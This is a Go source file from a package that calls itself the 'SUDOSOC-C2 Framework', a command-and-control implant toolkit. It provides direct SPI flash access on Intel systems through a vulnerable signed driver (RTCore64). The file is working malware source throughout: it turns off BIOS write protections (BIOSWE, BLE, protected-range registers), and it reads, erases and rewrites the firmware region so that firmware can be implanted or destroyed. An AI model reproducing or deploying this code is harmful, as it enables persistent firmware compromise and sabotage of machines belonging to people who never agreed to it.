package uefi

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SPI flash read/write — direct firmware chip access.

	The UEFI firmware image lives in a SPI (Serial Peripheral Interface)
	NOR flash chip soldered to the motherboard. On Intel platforms the
	SPI controller is part of the PCH (Platform Controller Hub) and is
	memory-mapped at a fixed MMIO address readable from the PCI config space.

	SPI Flash regions (defined by the Flash Descriptor at offset 0):
	  Region 0: Flash Descriptor   (read-only from OS in most configs)
	  Region 1: BIOS               (writable if BIOSWE=1, BIOS_WP=0)
	  Region 2: Management Engine  (ME, inaccessible from OS)
	  Region 3: Gigabit Ethernet   (GbE, rarely present)
	  Region 4: Platform Data      (PDR)

	Access from Windows:
	  Direct MMIO access to the SPI controller requires physical memory
	  mapping. We use MmMapIoSpace equivalent through our kernel driver
	  (BYOVD module — RTCore64 kernel R/W primitive) to:
	    1. Locate the PCH SPI controller MMIO base from PCI config space.
	    2. Read the Flash Descriptor to find BIOS region offset+size.
	    3. Check/clear SPI write protections (BIOS_WP, SMM_BWP, BLE).
	    4. Read/write the BIOS region via FIFO-based SPI transactions.

	Write protection bypass:
	  Modern systems have layered write protections:
	    a) BIOS_CNTL.BIOSWE (bit 0): must be 1 to write, usually locked
	       via BIOS_CNTL.BLE (bit 1) — writing BIOSWE triggers SMI
	    b) SPI Protected Range Registers (PR0..PR4): block specific ranges
	    c) SMM_BWP: BIOS write protect only from SMM context

	  The practical bypass on vulnerable systems:
	    - Use BYOVD kernel write to set BIOS_CNTL.BIOSWE=1, BLE=0
	      atomically before the SMI handler fires.
	    - Clear PR0..PR4 registers if they cover the BIOS region.

	  On systems with Intel Boot Guard this approach fails — Boot Guard
	  uses hardware to verify the initial firmware block and detect tampering.
	  Those systems require a hardware programmer (flasher).
*/

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// SPI controller register offsets (relative to SPIBAR MMIO base).
const (
	SpiHsfs       = 0x04 // Hardware Sequencing Flash Status
	SpiHsfc       = 0x06 // Hardware Sequencing Flash Control
	SpiFaddr      = 0x08 // Flash Address
	SpiFdata0     = 0x10 // Flash Data 0..15 (64 bytes total)
	SpiSsfs       = 0x90 // Software Sequencing Flash Status
	SpiBiosCntl   = 0xDC // BIOS Control (in PCI config, not SPIBAR)
	SpiPr0        = 0x74 // Protected Range 0..4
	SpiPr1        = 0x78
	SpiPr2        = 0x7C
	SpiPr3        = 0x80
	SpiPr4        = 0x84

	SpiHsfsCycle  = 0x0018 // HSFSTS.FCYCLE bits [4:3]
	SpiHsfsFlDone = 0x0001 // HSFSTS.FDONE
	SpiHsfsFlSel  = 0x0004 // HSFSTS.FCERR (flash cycle error)
	SpiHsfcFGo    = 0x0001 // HSFCTL.FGO — initiate hardware cycle
	SpiHsfcFDBIT  = 0x003F // HSFCTL.FDBC — flash data byte count minus 1
)

// FlashDescriptor layout at offset 0 of the SPI flash.
type FlashDescriptor struct {
	Signature     [4]byte   // 0x0FF0A5 0x00 — 5A A5 F0 0F
	MapComponent  [12]byte
	FlashMap0     uint32    // region base/limits encoded
	FlashMap1     uint32
	FlashMap2     uint32
}

// SPIController gives access to the SPI flash via MMIO.
type SPIController struct {
	barPhys  uint64  // SPIBAR physical address
	barVirt  uintptr // mapped virtual address (via kernel primitive)
	kRW      interface {
		ReadDword(addr uint64) (uint32, error)
		WriteQword(addr, value uint64) error
	}
}

// BIOSRegion describes the BIOS region in the SPI flash.
type BIOSRegion struct {
	Offset uint32
	Size   uint32
}

// OpenSPI locates the PCH SPI controller and maps it using the kernel
// read/write primitive (kRW, typically the RTCore64 device).
func OpenSPI(kRW interface {
	ReadDword(addr uint64) (uint32, error)
	WriteQword(addr, value uint64) error
}) (*SPIController, error) {
	barPhys, err := findSPIBar(kRW)
	if err != nil {
		return nil, fmt.Errorf("SPI BAR: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[spi] SPIBAR physical=0x%x", barPhys)
	// {{end}}
	return &SPIController{barPhys: barPhys, kRW: kRW}, nil
}

// findSPIBar reads the SPI controller MMIO base from PCI config space.
// On Intel PCH: Bus 0, Device 31, Function 5 (LPC/eSPI controller).
// RCBA or SPIBAR is at PCI config offset 0x10 (BAR0).
func findSPIBar(kRW interface {
	ReadDword(addr uint64) (uint32, error)
	WriteQword(addr, value uint64) error
}) (uint64, error) {
	// PCI config space is accessed via CF8/CFC port I/O or ECAM MMIO.
	// ECAM base on modern Intel: 0xE0000000 (configurable via MCFG ACPI table).
	// B:0 D:31 F:5 offset 0x10 = SPIBAR.
	const ecamBase = uint64(0xE0000000)
	const b, d, f = 0, 31, 5
	addr := ecamBase | uint64(b)<<20 | uint64(d)<<15 | uint64(f)<<12 | 0x10

	bar, err := kRW.ReadDword(addr)
	if err != nil {
		return 0, fmt.Errorf("read ECAM: %w", err)
	}
	// BAR is 32-bit MMIO; mask off attribute bits [3:0].
	return uint64(bar &^ 0xF), nil
}

// ReadFlashDescriptor reads and parses the Flash Descriptor at offset 0
// of the SPI flash image to find the BIOS region bounds.
func (s *SPIController) ReadFlashDescriptor() (*BIOSRegion, error) {
	// Read 12 bytes: signature (4) + reserved (4) + FLMAP0 (4).
	sig, err := s.spiRead(0, 4)
	if err != nil {
		return nil, fmt.Errorf("read descriptor signature: %w", err)
	}
	// Valid descriptor signature: 0x0FF0A5 stored as 5A A5 F0 0F.
	if sig[0] != 0x5A || sig[1] != 0xA5 || sig[2] != 0xF0 || sig[3] != 0x0F {
		return nil, fmt.Errorf("invalid flash descriptor signature: %x", sig)
	}

	// FLMAP0 at offset 0x14 — contains region base/limit addresses.
	flmap0Bytes, err := s.spiRead(0x14, 4)
	if err != nil {
		return nil, err
	}
	flmap0 := binary.LittleEndian.Uint32(flmap0Bytes)

	// FLREG1 (BIOS region) is at descriptor offset 0x54.
	// FLREG1[28:16] = limit (in units of 4 KB), FLREG1[12:0] = base.
	flreg1Bytes, err := s.spiRead(0x54, 4)
	if err != nil {
		return nil, err
	}
	flreg1 := binary.LittleEndian.Uint32(flreg1Bytes)
	_ = flmap0

	base := (flreg1 & 0x00001FFF) << 12
	limit := ((flreg1 >> 16) & 0x00001FFF) << 12
	if limit < base {
		return nil, fmt.Errorf("invalid BIOS region: base=0x%x limit=0x%x", base, limit)
	}

	region := &BIOSRegion{
		Offset: base,
		Size:   limit - base + 0x1000,
	}
	// {{if .Config.Debug}}
	log.Printf("[spi] BIOS region: offset=0x%x size=0x%x", region.Offset, region.Size)
	// {{end}}
	return region, nil
}

// DisableWriteProtection clears the SPI write-protection bits so the BIOS
// region becomes writable. This must be done before any WriteFlash calls.
//
// Bits cleared:
//   BIOS_CNTL.BIOSWE (PCH PCI config D31:F0 offset 0xDC bit 0) → set to 1
//   BIOS_CNTL.BLE    (same register bit 1)                      → clear to 0
//   PR0..PR4 (SPIBAR offsets 0x74..0x84)                       → clear to 0
func (s *SPIController) DisableWriteProtection() error {
	// Read current BIOS_CNTL from PCH PCI config space.
	const ecamBase = uint64(0xE0000000)
	const biosCntlAddr = ecamBase | (0<<20 | 31<<15 | 0<<12) | 0xDC

	cur, err := s.kRW.ReadDword(biosCntlAddr)
	if err != nil {
		return fmt.Errorf("read BIOS_CNTL: %w", err)
	}
	// BIOSWE=1, BLE=0 — enable writes, disable lock.
	patched := (cur | 0x01) &^ 0x02
	if err := s.kRW.WriteQword(biosCntlAddr, uint64(patched)); err != nil {
		return fmt.Errorf("write BIOS_CNTL: %w", err)
	}

	// Clear Protected Range registers.
	for _, pr := range []uint32{SpiPr0, SpiPr1, SpiPr2, SpiPr3, SpiPr4} {
		addr := s.barPhys + uint64(pr)
		if err := s.kRW.WriteQword(addr, 0); err != nil {
			// Non-fatal — some PRs may be locked.
			// {{if .Config.Debug}}
			log.Printf("[spi] PR@0x%x clear failed: %v", pr, err)
			// {{end}}
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[spi] write protection disabled")
	// {{end}}
	return nil
}

// ReadFlash reads `length` bytes from the SPI flash at `offset`.
func (s *SPIController) ReadFlash(offset, length uint32) ([]byte, error) {
	return s.spiRead(offset, length)
}

// WriteFlash writes data to the SPI flash at `offset`.
// The region must be erased (all 0xFF) before writing.
func (s *SPIController) WriteFlash(offset uint32, data []byte) error {
	return s.spiWrite(offset, data)
}

// EraseBlock erases a 4K block at offset (sets all bytes to 0xFF).
func (s *SPIController) EraseBlock(offset uint32) error {
	return s.spiErase(offset)
}

// spiRead performs a hardware-sequenced SPI read via HSFSTS/HSFCTL.
func (s *SPIController) spiRead(offset, length uint32) ([]byte, error) {
	result := make([]byte, 0, length)
	for pos := uint32(0); pos < length; pos += 64 {
		chunk := uint32(64)
		if pos+chunk > length {
			chunk = length - pos
		}
		// Set flash address.
		if err := s.kRW.WriteQword(s.barPhys+SpiFaddr, uint64(offset+pos)); err != nil {
			return nil, err
		}
		// Issue read cycle: HSFCTL = FGO | ((chunk-1) << 8) | cycle=0.
		hsfctl := uint32(SpiHsfcFGo) | ((chunk - 1) << 8)
		if err := s.kRW.WriteQword(s.barPhys+SpiHsfc, uint64(hsfctl)); err != nil {
			return nil, err
		}
		// Poll FDONE.
		if err := s.pollDone(); err != nil {
			return nil, err
		}
		// Read data from FDATA registers (4 bytes each).
		for i := uint32(0); i < chunk; i += 4 {
			dword, err := s.kRW.ReadDword(s.barPhys + SpiFdata0 + uint64(i))
			if err != nil {
				return nil, err
			}
			b := make([]byte, 4)
			binary.LittleEndian.PutUint32(b, dword)
			n := chunk - i
			if n > 4 {
				n = 4
			}
			result = append(result, b[:n]...)
		}
	}
	return result, nil
}

// spiWrite writes in 64-byte chunks.
func (s *SPIController) spiWrite(offset uint32, data []byte) error {
	for pos := 0; pos < len(data); pos += 64 {
		chunk := 64
		if pos+chunk > len(data) {
			chunk = len(data) - pos
		}
		// Write data to FDATA registers.
		for i := 0; i < chunk; i += 4 {
			var dword uint32
			n := chunk - i
			if n > 4 {
				n = 4
			}
			b := make([]byte, 4)
			copy(b, data[pos+i:pos+i+n])
			dword = binary.LittleEndian.Uint32(b)
			if err := s.kRW.WriteQword(s.barPhys+SpiFdata0+uint64(i), uint64(dword)); err != nil {
				return err
			}
		}
		// Set address.
		if err := s.kRW.WriteQword(s.barPhys+SpiFaddr, uint64(uint32(offset)+uint32(pos))); err != nil {
			return err
		}
		// Issue write cycle (cycle type = 2).
		hsfctl := uint32(SpiHsfcFGo) | ((uint32(chunk) - 1) << 8) | (2 << 1)
		if err := s.kRW.WriteQword(s.barPhys+SpiHsfc, uint64(hsfctl)); err != nil {
			return err
		}
		if err := s.pollDone(); err != nil {
			return err
		}
	}
	return nil
}

// spiErase erases a 4 KB block (cycle type = 3).
func (s *SPIController) spiErase(offset uint32) error {
	if err := s.kRW.WriteQword(s.barPhys+SpiFaddr, uint64(offset)); err != nil {
		return err
	}
	hsfctl := uint32(SpiHsfcFGo) | (3 << 1)
	if err := s.kRW.WriteQword(s.barPhys+SpiHsfc, uint64(hsfctl)); err != nil {
		return err
	}
	return s.pollDone()
}

// pollDone spins until HSFSTS.FDONE is set or FCERR is set.
func (s *SPIController) pollDone() error {
	for i := 0; i < 10000; i++ {
		status, err := s.kRW.ReadDword(s.barPhys + SpiHsfs)
		if err != nil {
			return err
		}
		if status&SpiHsfsFlSel != 0 {
			return fmt.Errorf("SPI flash cycle error: HSFSTS=0x%x", status)
		}
		if status&SpiHsfsFlDone != 0 {
			return nil
		}
	}
	return fmt.Errorf("SPI poll timeout")
}

// Close unmaps the SPIBAR mapping.
func (s *SPIController) Close() {
	if s.barVirt != 0 {
		_ = windows.VirtualFree(s.barVirt, 0, windows.MEM_RELEASE)
		s.barVirt = 0
	}
}

// Helpers: reuse unsafe.Pointer without importing extra packages.
var _ = unsafe.Pointer(nil)
